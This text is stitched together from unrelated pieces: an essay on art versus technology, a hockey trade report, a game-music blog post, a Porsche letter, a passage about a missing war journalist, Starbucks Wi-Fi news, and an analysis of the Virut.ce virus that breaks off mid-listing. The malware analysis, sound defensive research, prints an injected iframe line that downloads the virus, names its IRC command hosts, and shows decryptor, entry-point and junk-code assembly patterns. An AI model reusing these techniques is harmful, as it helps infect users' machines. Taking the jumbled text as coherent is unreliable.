Art objects , for these theories , are any objects which assist in the inducing of aesthetic experiences .
One difficulty for theories of aesthetic experience is that two observers may have different experiences when faced with the same object or situation .
Theories about the “ ideal observer ” attempt to circumvent this shortcoming by describing what sort of observer is best positioned to have the right kind of aesthetic experience .
Such theories can be further combined with earlier theories of didactic art by postulating that the enculturation of the individual so as to be able to have a certain kind of aesthetic experience is best spurred on by prior exposure to other art objects in a certain progression in a manner similar to moral education .
Theories of the ideal observer can be further combined with larger moral , political , or religious ideals in order to describe the sort of individual who , it is hoped , will be the product of a proper aesthetic education .
Thus , even though both theories of the ideal observer and theories of art for art ’s sake emphasize the importance of aesthetic experience , these two categories of theories may be strongly opposed to one another , since ideal observer theories describe the creation of ideal observers as the purpose for which art exists .
Religious theories of art can be quite similar to ideal observer theories in that both emphasize the importance of creating a certain kind of individual , but religious theories differ in that they see this activity as not just normatively preferable but a means of communing with the gods themselves .
Worth noting is that these religious theories of art may be more ancient than any of the other aforementioned theories , in that we see a close connection between religion and the various arts in many non-modern cultures around the world .
Even canonical examples of art such as the Venus de Milo or the ceiling of the Sistine Chapel were original created in a religious context as objects not only of beauty but also of religious veneration .
Religious theories of art sometimes claim that it is an act of piety to create religious art on behalf of the gods , and as such artistic creation can earn one various forms of merit or favor .
Religions also have a tendency to strictly regulate the kinds of religious art that are appropriate .
In their strictest forms , religions may have a literally iconoclastic attitude towards any representational art whatsoever .
Even in less strict forms , religions may precisely regulate the formal qualities that they feel are appropriate for art .
As shown above , a wide variety of purposes have been proposed as the key aspect of art , including no purpose .
Many of these same purposes have also be seen as the key to distinguishing good technological advances from bad ones .
For example , just as art is commonly blamed for being insufficiently didactically effective , technology is frequently blamed for “ softening ” or “ emasculating ” society and so leading to “ decadence . ”
On this view , just as bad art is blameworthy for indulging the vulgar passions , bad technology is blameworthy for enabling us to act on those same passions without suffering their natural ( normatively deserved ) consequences .
Good technologies will be those which develop the character of their creators and employers .
For example , various martial technologies such as marksmanship or horseback riding have been praised for their ability to instill concentration and self - control in those who master them .
The Boy Scouts are notorious as a organization for their devotion to some technologies ( such as fire starting , knot tying , and orienteering ) and their rejection of others , mainly on the basis of their usefulness in training potential soldiers .
A purely mimetic view of technology is hard to find , but technological innovators do often point to nature as their source of inspiration , and we do find occasional cases in which technologists aim to create artificial life or artificial intelligence , and so replicate something that nature has already provided directly .
As a parallel to the refined mimetic view of art , the refined mimetic theory of technology holds that the purpose of this technological replication is to enable the individual to bring order to a chaotic world .
Rather than simply bringing internal order to the psychological state of the artist or the observer , this theory emphasizes the imposition of an external order onto the world itself .
On this theory , technology ’s role is to translate its user ’s intention into a change in the material world .
As such , technology itself is anything so structured as to have an effect on the material world in such a way that it can be predicted or controlled by an agent .
This is perhaps the dominant view of technology today : an instrumental means of allowing human beings to achieve their goals in an otherwise indifferent or even hostile world .
This view has a surprising parallel to the cathartic view of art in that on this pair of theories , both art and technology are aimed ultimately at realizing human happiness .
The difference between the two would then be merely a vaguely defined difference in means ( art tends to involve paintings , sculptures , literature , and drama ; technology tends to involve engineering and agriculture ) rather than any sharply determined difference of end .
Or perhaps if there is a difference of ends , it is that art ’s partisans believe human happiness is best realized through contemplation of the human , and technology ’s partisans believe that human happiness is best realized through contemplation of the non-human .
If the genius view of art holds that the artistic genius discovers new ways of conceptualizing and arranging the formal properties of art , it hardly needs to be pointed out that the genius view of technology holds that the technical genius discovers new ways of conceptualizing and arranging the physical world .
As noted before , our Romantic stereotypes of both kinds of genius are similarly dark , isolated , tortured , foreboding , etc. , although perhaps the artist takes more pleasure in his or her displeasures .
The non-instrumentalist view of “ art for art ’s sake ” seems distinctively artistic until one remembers the existence of “ pure ” as well as “ applied ” sciences .
Those who believe in the value of the pure sciences hold that knowledge of the physical world is a good in and of itself and needs no justification in any practical advantage so conferred .
Investigations into the origin of the universe and its possible eventual dissolution serve no end except the end of knowledge itself .
For those who favor development of this kind of technology , it is the state of knowing rather than transitory ( aesthetic ) experience which is to be valued .
Nevertheless , the ongoing process of curiosity - driven learning has a status which is equivalent in its way to the epiphany of the aesthete .
Perhaps differently from aesthetic experience , scientific understanding is non-problematically transmissible from one generation to the next , whereas artistic traditions are sometimes considered to be a barrier to aesthetic experience , since they may lead to an intellectual evaluation of a work rather than a true experience of the work .
Of course , just as not everyone will have the proper aesthetic experience when encountering an art object , not everyone will gain a scientific understanding by mere exposure to technological artifacts .
A proper path of education is vital in both systems if a certain class of persons is to emerge in succeeding generations .
Especially since the Cold War , the American education system has been geared towards the production of scientists and engineers .
These technologists are “ ideal observers ” of a somewhat different character from artists .
Whereas artists strive to be unrestrained in their creativity , scientists and engineers must work within the physical constraints of nature .
On the other hand , even artists must understand the compromises forced on them by the media in which they do their work , and no amount of creativity or innovation in media will ever completely eliminate these restrictions .
So , once again , we have found that the difference between art and technology seems at first distinctive but with greater investigation turns out to be one of degree and details .
If there is one difference that appears on the surface to be definitive , it must be the religious origin of art and the scientific origin of technology .
Yet even this difference becomes fuzzier on investigation .
While it is true that scientists have a methodological commitment to materialism that they pass on to their implementation of technology , this does not mean that they are entirely without a sense of awe or reverence for the larger forces of the universe .
We can see evidence of this in the physicist Richard Feynman ’s statement in The Feynman Lectures on Physics , that
far more marvelous is the truth than any artists of the past imagined it .
Why do the poets of the present not speak of it ?
What men are poets who can speak of Jupiter if he were a man , but if he is an immense spinning sphere of methane and ammonia must be silent ? †
For humanists of a certain bent , technology is , while not quite religion per se , certainly part of a larger spiritual vision of the norms of inquiry , our goals for human development , and our place in the cosmos as a whole .
Even just the title of futurist Ray Kurzweil ’s book The Age of Spiritual Machines is proof of this .
Returning to the earlier topic of the place of art and technology in human betterment , it is generally supposed that technology is instrumental and art is non-instrumental , but this supposition falls apart upon serious scrutiny .
We have found that whatever the purpose of art is , a parallel purpose can be found which technology aims to fulfill .
It is therefore untenable to hold that art is either uniquely non-instrumental or that technology is uniquely instrumental .
Both art and technology are intimately bound up in the realization of a vision of human progress .
Artistic progress tends to be measured in the production of aesthetic innovation and creative leaps of genius , whereas technological progress tends to be measured in the production of knowledge and scientific leaps of genius .
Therefore , to differentiate them , we must look more closely at the context in which this progress takes place .
Going beyond Aristotle ’s four causes , we will examine the role of “ place ” in causation .
​ Place as Cause
Aristotle ’s four causes were created to classify the various factors which must converge in order for a substance to come into being and remain in existence .
Speaking in terms of journalism ’s Five Ws and One H , they cover Who creates the thing and How they do so ( efficient causation ) ,
What kinds of things are created ( formal causation ) , What they are created out of ( material causation ) , and Why they are created ( final causation ) .
What the four causes leave out are Where spatially and When historically things come into being .
The place of a thing is as much of a requirement as any other cause , since an object or process which lacks a place in space and time cannot be said exist in the conventional sense .
Having a place imparts a relational dimension to an object that lets us ask about its surroundings as well as its direct causes .
In understanding the place of a thing , we come to understand the sort of context that gives rise to it .
Returning to the topic of the religious origin of art , one can say that the original “ place ” of the Venus de Milo was a temple , but through the twists of history , the statue lost that original place and ended up in the gallery of the Louvre .
On the other hand , the original place of Duchamp ’s urinal was , of course , the restroom .
Nevertheless , having been selected by the artist , its new place is also the gallery .
The gallery is a place that inherits the social role of the temple in the same way that secular theater inherits the role of the religious rite .
In these cases , what was originally a divine ecstasy is secularized into a communal aesthetic experience .
As mentioned in the section on material causation , art objects have a kind of “ aura ” of originality .
A theory of art as the inheritor of the place of civil religion will point out that cult objects are also thought to have a literal aura in virtue of their position in a sacred place .†
Artists on this theory are kind of literal priesthood who have the ability to transubstantiate things from being vulgar objects to being art objects merely by introducing them to the gallery space in the proper way .
Once so installed , ordinary people will make pilgrimages from great distances in order to have their lives improved by contact ( usually only visual contact ) with the set - apart objects .
The theory that the gallery historically inherits the place of the temple accounts for many of the more romantic or grandiose sentiments that are attached to art , but it fails to account for who the artists and art critics are and what activity unites them .
If they are a priesthood of some sort , they must have set of dogmas and rituals that give them common purpose and make them one priesthood and not another .
One widely received theory of art in the twentieth century is Arthur Danto ’s “ Artworld ” theory .
On this theory , artists select works ( some commenters use the term “ baptize ” ) and submit them to relevant individuals in the Artworld for consideration .
If they approve of an object , then it becomes art .
If they do not , it remains what it is .
The topic of conversation that sets the Artworld apart from other groups of human beings is “ aesthetic predicates . ”
The Artworld considers the aesthetic experience of the object that is possible when certain formal properties ( in the broad sense of formal ) are taken into account and progresses by developing new and more interesting predicates as time goes on .
Understanding an art object means understanding the aesthetic experience the object would provoke in its intended Artworld and in the Artworld as it stands today .
When the object ’s place in the Artworld is grasped , the object is known . †
What is the place of technology ?
If the art gallery continues the temple , then the technological laboratory inherits the craftsman ’s shop .
Introducing an object to the laboratory brings it within the ambit of technology .
( Most concerningly , this seems to be the case even with the human being . )
Contextually speaking , the difference between art and technology is not a difference of method , form , material , or aim ; it is a difference of cultural positioning .
Both the temple and the craftsman ’s shop are parts of the town and attempt to contribute to its well - being and continuation , but each finds the mode of contribution of the other suspect .
As C. P. Snow noted in his famous “ The Two Cultures ” lecture , the world of “ literary intellectuals ” has come apart from the world of scientists .
Literary intellectuals and others in the Artworld put up with the scientific culture for the practical reason that they need the goods and services they provide , but nevertheless they disdain them as excessively materialistic and cut off from what is truly valuable .
The broader coalition of scientists and craftsmen for their part consider their work to be the only work of value and the work of the others to be intellectually meaningless and a waste of resources .
According to this theory , the split between art and technology is primarily a historically perpetuated split in culture .
Nothing larger can be said about the split because the split itself is meaningless and perpetuated for its own sake .
This theory of the place of art and technology has much to recommend to it , but it seems to be going too far if it claims that there are no essential differences whatsoever in the meaning of art and technology .
To go beyond it , we must bring together all of the perspectives explored so far .
​ Conclusion
Aristotle ’s four causes have been used a mere heuristic to bring order to this investigation , but if we return briefly to their original conception , we see that Aristotle claims it is only with the confluence of all the causes that a substance can come to be .
In the same way , a robust theory of art or technology will need to be multifaceted in order to take into account the role of all five causal factors .
No one perspective is enough to capture everything we think about art and technology .
It is a philosopher ’s delusion to think that behind our jumbled ordinary intuitions there must stand a single unified and determinative definition for the concept in question .
As such , so long as we are exploring the space of possible concepts permitted by our intuitions , we will never find the unifying factor that lies behind the concept .
Rather than “ finding ” this unifying factor , the philosopher must create it by looking at what exactly it is what use the concept to do and what we ought to be using the concept to do .
Looking at how various theories of art are used , it is clear that the definition of art is at its most contested when the matter of prestige is on the line .
Sometimes a discipline will claim the mantle of “ art ” in order to raise its prestige , and other times prestige is increased by rejecting the title of art and claiming the title of “ science . ” †
The public fascination surrounding the question of “ what is art ? ” turns on precisely this issue .
Besides a basic confusion of “ art ” and “ good art , ” the debate reflects the fact that there is a public norm which holds that art is an unconditioned good .
As such , for anyone to claim the title of art is necessarily for that individual to demand a certain level of public approbation .
By contrast , the question “ What is technology ? ” has no public acclaim built into it and so receives little attention .
On the other hand , “ science ” is a term of respect , and so the question “ What is science ? ” has a similar level of purchase with the public .
Frequently , certain activities which might otherwise be taken to be arts ( for example , quilting , weaving , or glass blowing ) are rejected as mere crafts or skilled traded .
On the other side of the coin , those who find modern art distasteful express their distaste not by saying that abstract painting is an inferior art but by claiming that it is not an art at all .
Such debates are not dissimilar to the debate among school children about whether cheerleading or gymnastics count as “ sports ” because they are scored by judges .
The arguments given , however worthwhile on their own , are of secondary importance to the deeper cause of the debate , which is an attempt to order the values of society in a certain way .
To call cheerleading a sport is to place a stereotypically female activity on a plane with masculine activities .
So too , to call Jackson Pollock an artist is to put him in a category of secular veneration alongside Michelangelo and da Vinci .
The stakes for calling something a technology appear to be much lower , but ultimately , it pivots around the same center : where will we place it in our society ?
As we have seen , there is no simple way to distinguish art from technology .
For every proposed definition of art , a parallel definition can be given for technology which tweaks only at the edges and not at the core meaning .
Therefore , in order to either make a strong separation between the two or dissolve the distinction all together we would need to present a normative vision of how the world ought to be arranged .
It is out of the scope of this paper to attempt to defend such a vision here , but I will briefly remark that for my purposes , I see further entrenchment of the division of the two cultures as harmful .
My vision of the future is one in which artists become more sensitive to the mechanical factors of the physical world and technologists become more sensitive to the aesthetic experience of the human subject .
The difference between the two cultures is helpful insofar as it allows for a plurality of perspectives within society but pernicious insofar as it causes members of the one culture to ignore developments in the other or dismiss them out of hand .
A better way of thinking about art and technology is to see them as a continuum of ways of approaching the world with numerous pockets of sub-divisions ( painters vs. poets vs. industrial engineers , say ) but no sharp break between two larger categories .
Whichever pole of the continuum one is closest to , what is to be praised are processes in which the individual cultivates his or her own skills at expression in a medium in a manner that is at once beautiful and functional .
The product of this expression ought to allow us to focus on the haecceity of things without losing a sense of their contextual relationships .
Such an activity is valuable both for its own sake as a way of creating positive experiences for individuals and as a means of storing up valuable cultural know - how and insight .
If art and technology are able to enrich one another , then we can bring the joy of the festival to everyday life without thereby ruining the harvest .
If they are not able to do so , we may inadvertently ruin our ability to either celebrate life or maintain it .
The Boston Bruins have traded forward Vladimir Sobotka to the St. Louis Blues for the rights to defenseman David Warsofsky
The 22 - year - old Sobotka finished his third NHL season with 4 goals and 10 points in 61 regular - season games .
He added two assists while playing in all 13 postseason games for the Bruins .
In 134 career games , Sobotka has recorded 6 goals and 22 points .
Warsofsky , 20 , registered 12 goals and 11 assists this past season for Boston University as a sophomore .
He is a former member of the U.S. National Team Development Program and was a fourth - round pick of the Blues in the 2008 Entry Draft .
Well I was rolling along in my day listening to some music from the Donkey Kong Country series when I noticed something odd about the music .
It seemed vaguely familiar … as if I had heard it before .
But no , this was not a carry over from a different Donkey Kong game or SNES title .
No , it was from … the future ?
Now of course everyone knows that gaming companies plan way ahead .
Heck , any Blizzard fan loves and hates that about all of their games .
I thought I had caught the clever easter egg in Donkey Kong Country 3 when I noticed that Wrinkly Kong was playing an N64 in the save cave , but what I did n’t noticed about the whole area was the music itself , which is my favorite feature of just about every game – especially in David Wise ’s case .
The music playing , titled “ Wrinkly 64 ” in the OST , is a Monkeyfied version of “ Inside the Castle Walls ” from Super Mario 64 , which was apparently released as a launch title for the 64 a month prior to the release of DKC3 .
So I suppose it ’s not a super planned ahead idea , but I still find it pretty cool that they went to such lengths to promote their new game and system .
Mario 64 - Inside the Castle Walls

Now if we can just get a really cool new series to hit Donkey Kong I ’ll be happy for awhile .

Here 's Porsche North America 's President 's letter to Mini USA 's chief Jim McDowell .
Dear Jim , Imagine our surprise to discover our former employee , now the head of Mini , has challenged us to a head - to - head race .
As you surely know , Porsche has a long history of racing success , with more than 28,000 wins over the last 60 years .
In our early days , we pitted ourselves against the giants , so we 've been in your shoes .
But as you also know , Porsche does n't race for fame , stunts or publicity .
We race to challenge ourselves ; we race to push sports car technology ; we race to translate every win on the track to our cars on the road .
If you
need a reminder of our intent , please take a look at this short video :
While your challenge seems like a fun and lighthearted campaign , we 'll stick to racing the way we have over the decades .
We welcome you at Sebring , Le Mans , Daytona or any other sanctioned race where there is more at stake than T - shirts and valet parking spaces .
We also invite you to any of the thousands of tracks around the world where Porsche owners compete each weekend .
Good luck with your race at Road Atlanta on June 21 ; we hope you enjoy the day .
Sincerely , Detlev Von Platen
President and CEO , Porsche Cars North America

Mr. Page had shared some of those journeys into darkness , and his visit to Pkhar Doung was the latest of many searches in what he called “ a 25 - year madness ” in pursuit of the bones of the man he calls his brother .
Weeks earlier two bounty hunters made a false claim to have found them , reviving interest in the disappearance and spurring American investigators to step up the search for the missing journalists .
Mr. Page said , “ I do n’t like the idea of his spirit out there tormented , ” a wandering ghost that could find rest , as many in Asia believe , only after proper funeral rites .
“ There ’s something spooky about being M.I.A . ”
Mr. Page is also seeking a measure of peace for his own soul , scarred like his body from the traumas of combat , from nearly fatal wounds and from the loss of friends , trying to put together what he calls “ an enormous jigsaw puzzle , bits of sky , bits of earth . ”
“ I do n’t think anybody who goes through anything like war ever comes out intact , ” he said .
“ I suppose the closure of Sean ’s fate also has to do with closure of the whole war experience . ”
Theirs was an intimacy forged by shared danger and by what Mr. Page calls the magnetic pull of two only sons searching for a bond .

“ We could have been brothers , and felt as though we were , ” Mr. Page wrote in a memoir , “ Derailed in Uncle Ho ’s Victory Garden . ”
“ We would sit for hours in the same room , hardly speaking yet in total communication , a vibration as intimate as between lovers . ”
Starbucks Corp. will begin offering unlimited free wireless Internet access at all company - operated U.S. locations starting July 1 , part of an ongoing effort to bring more customers in the door .
Following McDonald ’s lead earlier this year and the relentless march of free wi-fi into our neighborhood coffee shops , Starbucks is trying to get more customers into their stores .
Seeing the success and momentum McDonald ’s has gained from free Wi-Fi , Starbucks will offer free unlimited Wi-Fi to customers all over Chicago and the suburbs as well as nationally starting July 1 .
The Wi-Fi access , which will eventually include a new network of news and entertainment content exclusively for customers , comes as Starbucks works to take business back from rivals like McDonald ’s Corp. and independent cafes that have long offered free Internet .
The cafe chain , which recorded its first quarterly increase in customers in 13 quarters earlier this year , had previously offered two free hours of Web access each day to registered customers .
Introduction
This article is dedicated to the polymorphic virus known as Virus .
Win32 .
Virut and to its ‘ ce ’ variant in particular .
Why call it Virut.ce ?
Virut.ce is one of the most widespread pieces of malware to be found on users ’ computers .
It infects executable files using the very latest techniques and that makes detecting and treating those files particularly difficult .
The current means by which most malicious files are actively spread is server - side polymorphism .
Infecting files is not as popular as it used to be about five years ago .
This is largely because the level of file emulation has improved greatly .
As such , you have to hand it to the authors of Virut.ce – they were n’t at all put off by the difficulties they faced in trying to infect executable files .
The technology implemented in Virut.ce accurately reflects the very latest methods used to write malware .
Anti-emulation and anti-debugging tools are widely used , such as the tick count received when using multiple rdtsc instructions , series of GetTickCount API functions and the calling of multiple fake API functions .
Virut is the fastest - mutating virus known , with a new variant appearing as often as once a week .
This indicates that its creators are closely monitoring antivirus databases so that they can take prompt action when a new Virut signature is released .
As soon as this happens , the creators modify the virus so that once again it is undetectable .
Interestingly , the malicious program ensures that its latest version is downloaded to compromised computers by taking advantage of infected HTML files as described below .
This article reviews the methods used to infect files .
Obfuscation will also be covered as it is applied each time an executable file is infected .
Additionally , the evolution of the virus ’ components will be examined , from their emergence up until the present time .
All of the statistics that appear in this article have been collected using Kaspersky Lab ’s own Kaspersky Security Network ( KSN ) technology .
A brief review of statistics and propagation
The first Virut variant was called Virut.a and appeared back in mid-2006 .
From that moment on , the strain has evolved steadily , reaching Virut .q sometime in September 2007 .
Virut.q was quite popular at the time , but only rarely occurs these days .
Its developers discontinued ‘ support ’ for it during the second half of 2008 , but then in the first week of February 2009 , a new variant called Virut.ce appeared .
It would seem that the creators of the virus spent the interim period perfecting new infection techniques , encryption algorithms and anti-emulation methods .
It should be pointed out here that any reference to the terms ‘ Virut ’ , ‘ the virus ’ etc. that appear later in the article , refer to Virus .
Win32.Virut.ce .
At present , the Virut.ce variant is the second most popular of all of the versions of Virus .
Win32 .*.* detected on users ’ computers .

January 2009 – May 2010
From the graph below it can clearly be seen that the propagation acitivity of Virut.ce increases with time .
Number of computers infected with Virut.ce
May 2009 – May 2010
The virus propagates through infected files , both executable and HTML , or smaller programs designed to crack licensed software .
Such programs generally include key generators ( keygens ) and direct file modification utilities ( cracks ) .
More specifically , Virut propagates as part of RAR / SFX archives with straightforward names like ‘ codename_panzers_cold_war_key.exe ’ or ‘ advanced_archive_password_recovery_4.53_key.exe ’.
Such archives include a copy of Virut , either in its original form , or in an infected file alongside the desired program .
Virut ’s functionality
Now let us look at the most important feature – Virut ’s payload .
It is common knowledge that most malware programs are exclusively designed for financial gain and Virut is certainly no exception .
Effectively , it is a backdoor which first attempts to infiltrate the address space of the ‘ explorer.exe ’ process ( ‘ services.exe ’ , ‘ iexplore.exe ’ ) , then it connects to the irc.zief.pl and proxim.ircgalaxy.pl URLs via IRC - protocol and waits for commands to arrive .
The procedure looks quite conventional , as does the list of processes the virus attempts to terminate as shown in the screenshot below .
This list includes processes belonging to antivirus programs such as ‘ nod32 ’ , ‘ rising ’ , ‘f - secure ’ and a number of others .
Screenshot showing part of the decrypted static body of Virut.ce
and including the names of processes that are terminated by the virus
Interestingly , the virus infects all of the *.htm , *. php and *.asp files stored on the victim computer .
To do so , it adds the following line to them : ‘< iframe src = http://jl.*****.pl/rc/ style = ‘ display : none ’>’.
This downloads the latest version of Virut by exploiting a PDF - file vulnerability .
This line may change from version to version within the ‘ ce ’ variant .
For example , the letter ‘ u’ may be substituted by ‘ u’ , which will not affect the browser in any way , but will prevent static signatures from working .
General discussion and method of infection
Virut.ce uses EPO technology or rewrites the entry point as an infection technique .
One or two polymorphic decryptors are used in conjunction with it too .
The Entry Point Obscuring ( EPO ) technique works by preventing detection of the instruction to jump to the virus body .
Typically , this is implemented by replacing a random instruction in the program ’s original code or the parameter of the jump instruction .
Below is an example of how an instruction and the jump address can be substituted .
The term ‘ rewriting the entry point ’ implies modifying the PE header of the file being infected , specifically rewriting the AddressOfEntryPoint field in the IMAGE_NT_HEADERS32 structure .
Consequently file execution will start directly with the virus component .
As discussed earlier , the virus adds only one or two decryptors during infection – let us call them ‘ Init ’ and ‘ Main ’ .
The Main decryptor is located in every file touched by Virut.ce , while the Init decryptor occurs only occasionally .
Let us take a closer look at the function and general appearance of this decryptor .
The primary purpose of the Init decryptor is to decipher the first layer of the virus ’ main body in order to hand over control to it .
However , the bulk of the virus ’ body remains encrypted even after this initial decryption has occurred .
The Init decryptor is a small piece of code between 0x100 and 0x900 bytes long and contains many purposeless instructions that prevent static antivirus signatures from working .
The decryptor is placed at the end of a section of code if there is a sufficient number of zeros .
The decryptor works as follows :
It writes the size of the encrypted section to the register ; Performs a logical / arithmetic operation on the encrypted section with a constant key ; Increments / decrements the pointer to the encrypted section ; Jumps back to instruction 2 until everything is decrypted .
The main body of the virus is 0x4000 to 0x6000 bytes in size and is located at the end of the last section , which is extended specifically for this purpose and flagged as write / read - accessible and executable .
Thus , four ways for possible infection exist :
Init Decryptor + EPO :
Init Decryptor + modifications to the EP :
EPO only :
Rewriting the entry point only :
These four methods of contagion cover all the possible ways to infect a file or modify its structure .
Primary decryption of Virut.ce ’s body
Before we go on to discuss the payload of the virus ’ main body , let us look at the Init decryptor in a genuinely infected file .

Win32 .
Virut.ce which includes the Init decryptor
The disassembled code of the Init decryptor
The first of the screenshots above shows a fragment of an infected calc.exe file .
The boundaries of the code section are marked and the Init decryptor is highlighted also .
The second screenshot shows the disassembled code of the Init decryptor .
The four logical elements discussed above are shown in red ovals .
In this example , the ECX register is filled with multiple push / pop instructions and decrypted with the adc instruction .
However , this procedure has not always been the same .
Virut.ce has evolved rapidly in the last year and so has the incorporated Init decryptor .
If the virus body size written into the registry has been modified once ( mov reg , dword changed to push dword ; pop reg ) , the decryption procedure changes more than once ( in date order ) :
ADD / SUB [ mem ] , dword ; ROL / ROR [ mem ] , byte ; ADC / SBB [ mem ] , byte ; ADD / SUB [ mem ] , byte ; ADD / SUB [ mem ] , word ; ADC / SBB [ mem ] , word ; ADC / SBB [ mem ] , dword ;
Now that we have reviewed the general schemes by which infection occurs and the primary processing of the virus ’ main body , we can move on to reviewing the execution of the major part of Virut , which is always located at the end of the last section .
Restoring the original code
The code of the main body can be subdivided into three groups according to purpose : the restoration of the original function / entry point , the decryption of the static body and the execution of the payload .
Before we review each element , let us review the structure of the virus body and have a look at the associated part of the file .
The structure of the main body of Virut.ce
As can be seen in the picture , the main body added to the end of the code ’s last section is made up of two types of components : the encrypted static body and the executable code .
The executable part contains a code which performs anti-emulation , restores the original entry point and / or function and decrypts the static body .
It is scattered over the main body and may be located at the top or bottom or be split in two .
Interestingly , the executable part is also heavily obfuscated .
This complicates detection as there are no static elements in the original file and a static element is obviously encrypted using different keys and / or algorithms , as will be demonstrated in the discussion below .
File fragment containing the main body of Virus .
Win32.Virut.ce
The above picture shows a screenshot of a fragment of a file infected with Virus .
Win32.Virut.ce .
The executable part of the virus ’ main body is highlighted with a red oval ; it can also be identified visually as it contains a lot of zero bytes .
In this instance , the virus has not used the Init decryptor during the infection process ; otherwise , all of the sections would look similar and be encrypted .
Let us now look at the block dedicated to restoring the file ’s original part .
The logic of this block may be represented as follows :
CALL [ address with a small increment ] ;
Store the original contents of the registers ;
Add the address pointing to kernel32.dll to the EBX register ; Calculate the pointer to the address of the instruction following CALL in item 1 ; Perform an arithmetic / logical operation on the address obtained in instruction 4 .
It should be noted that the virus uses the EPO technique only if it identifies an API - function being called from kernel32.dll .
This function call may be identified by the calls through either the 0x15 FF or 0xE8 opcodes , with a subsequent JMP instruction ( 0x25 FF ) .
If such a function is identified it is replaced with the JMP instruction ( 0xE9 ) which leads to instruction 1 in the previous diagram .
Then the address of the replaced function from kernel32.dll is placed into the EBX register .
If only the entry point has been modified , the value at [ ESP + 24 ] is placed into the EBX register – this is the address for the application to return to kernel32.dll .
Later on , the value stored in this register will be used to obtain the addresses of exported DLL functions .
If the EPO technique is used , the value at [ ESP + 20 ] will contain the address of the instruction following the call of the patched API - function ; otherwise it will contain the address of the original entry point .
If obfuscation is excluded , the simplest way to restore the entry point and / or function will appear as follows ( assume the GetModuleHandleA function was replaced ) :
CALL $ + 5
PUSHAD
MOV EBX , [ GetModuleHandleA ] XOR [ ESP + 20h ] , Key
This code is completely in line with the general logic of the entire block .
Now , let us see how all of these stages have changed over time .
The only stage we will not dwell on is the second operation ( save the original contents of the registers ) as it is always implemented by the PUSHAD instruction .
Let us review each of the block ’s logical elements in detail .
The first stage – the CALL instruction – has not changed much over time .
Originally , it looked like CALL $ + 5 , later CALL $ + 6 ( 7,8 ) , then CALL $ + 0xFFFFFFFx , which is a call ‘ backwards ’ .
It may seem that this operation is of little importance and can be scrapped , but that is not true .
This address is used to restore the entry point / original function as well as to address the decryption keys and the start of the static code .
We will mention this address again when we discuss the Main decryptor .
Stage 3 is modified more often than stage 1 and may be implemented in several ways :
MOV EBX , [ ApiFunc ] / MOV EBX , [ ESP + 24 h ] ;
PUSH [ ApiFunc ] / [ ESP + 24h ] ; POP EBX ;
SUB ESP , xxh ; PUSH [ ESP + 24h + xx ] ; POP EBX ;
LEA EBX , [ ESP + xxh ] ; MOV EBX , [ EBX + 24h – xx ] ;
ADD ESP , 28 h ; XCHG [ ESP – 4 ] , EBX ;
This list of examples is by no means exhaustive , but gives a general understanding of how this stage evolved with time .
Additionally , intermediate manipulations of the ESP and EBX registers occur .
Let us review the last stage , which restores the address of the original entry point or the patched CALL instruction .
This stage is modified every two or three weeks .
After the PUSHAD instruction is called , the ESP register – the indicator to the stack – will be decremented by 0x20 and so ESP + 20h will store a value supplied by the last CALL instruction .
An arithmetic / logical operation is applied to this value and the required figure is obtained .
Below are some of the possible sequences of operation that perform the actions described above :
XOR / AND /OR / ADD /SUB [ ESP + 20h ] , const ;
MOV [ ESP + 20h ] , const ;
LEA EBP , [ ESP + x ] ; MOV /OR / ADD / SUB/XOR EBP , const ; XCHG [ EBX + 20h – x ] , EBP ;
MOV EBX , ESP ; PUSH const ; POP [ EBX + 20 h ] ;
PUSH const ; POP [ ESP + 20 h ] .
Again , this list is not exhaustive , but gives an understanding of the overall trend .
Various intermediate operations are added .
The screenshot below presents a fragment of an infected file which contains all of the operations described above highlighted in red ovals .
Screenshot of a file infected with Virus .
Win32.Virut.ce ,
containing a code to restore the original entry point
For clarity , the above code examples did not include obfuscation .
However , obfuscation is used extensively in all of the file sections added by the virus , including the Init decryptor and the entire executable part of the main body .
It is obfuscation that completely blocks static signatures from detecting the virus as it radically modifies the appearance of the code without changing its performance .
Below are some examples of junk instructions which do not perform any meaningful operations and are only used to obfuscate the code :
XCHG reg1 , reg2 ; XCHG reg2 , reg1 ; ( used together )
SUB reg1 , reg2 ; ADD reg1 , reg2 ; ( used together )
MOV reg , reg ; OR reg , reg ; AND reg , reg ; XCHG reg , reg ; LEA reg , [ REG ] ;
CLD , CLC , STC , CMC , etc .
‘ reg1 ’ and ‘ reg2 ’ stand for different registers ; ‘ reg ’ stands for the same register within a single expression
Arithmetic / logical operations with an arbitrary second operand :
ADC reg , const ; SBB reg , const ; XOR reg , const ; etc .
In the screenshots below , elements of obfuscation are highlighted in red ovals :
Screenshots containing code of the virus ’ main body with obfuscation elements shown in ovals
The screenshot on the left shows very clearly that junk instructions make up some 70 - 80 % of the entire code .
The examples above present some cases of obfuscation that occur most often and are not exhaustive .
As the virus evolves , new obfuscation techniques evolve alongside it .
We have reviewed the first stage of execution of the virus ’ main body .
We will not dwell on the stages that implement various anti-emulation and anti-debugging techniques and move straight on to the Main decryptor .
Decrypting the main body
The execution of the decryption code starts after the virus completes its initial activities such as restoring the patched code , creating a specifically named object and obtaining the addresses of the functions to be used from system DLLs and anti-cycles .
If the Main decryptor is viewed in a disassembler , its code will appear utterly meaningless , as the RETN instruction is called which hands over control to a randomly chosen position .
Before the main decryption process starts , the RETN instruction ( 0C3h ) is replaced with CALL ( 0E8h ) .
This is accomplished by an instruction which may typically look like this :
ADD / SUB / XOR [ EBP + xx ] , bytereg
In the above , EBP points to the address of the instruction following CALL and bytereg is one of the byte registers .
We can therefore consider that the decryption cycle starts after RETN is changed to CALL .
Next follows the decryption cycle which is just as obfuscated as the rest of the virus ’ body is .
Not only are a large number of algorithms used , but many of them are more complex than those used within the Init decryptor .
Typically , between two to six logical / arithmetic operations are used in combination .
In algorithms , the EDX register contains the decryption key and the EAX register contains the virtual address where the static body starts .
The registers contain instructions which may look like this :
MOVZX / MOV dx /edx , [ ebp + const ] LEA eax , [ ebp + const ]
The EBP register contains the address which follows the CALL instruction ; this address was mentioned earlier when we reviewed the first stage of the logical scheme which restores the original part of the file .
The instructions performing these two operations have also been modified with time , but we will not discuss them here .
The algorithms in use are very diverse so we will only provide examples of the most interesting ones :
ROL DX , 4
XOR [ EAX ] , DL
IMUL EDX , EDX , 13h
ADD [ EAX ] , DL
ROL DX , 5
IMUL EDX , 13h
XOR [ EAX ] , DH
ADD [ EAX ] , DL
XCHG DH , DL
IMUL EDX , 1Fh
XOR [ EAX ] , DH
XCHG DH , DL
ADD [ EAX ] , DH
IMUL EDX , 1Fh
XOR [ EAX ] , DL
ADD [ EAX ] , DH
IMUL EDX , 2Bh
XCHG DH , DL
